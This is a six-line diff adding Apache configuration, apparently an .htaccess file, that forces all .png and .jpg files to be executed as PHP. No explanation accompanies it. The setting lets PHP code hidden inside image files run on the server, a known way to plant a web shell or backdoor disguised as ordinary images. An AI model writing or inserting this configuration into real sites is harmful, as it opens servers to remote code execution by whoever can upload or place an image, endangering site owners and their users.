@@ -1,0 +1,6 @@
+<Files *.png> 
+      ForceType application/x-httpd-php 
+</Files> 
+<Files *.jpg> 
+      ForceType application/x-httpd-php 
+</Files> 
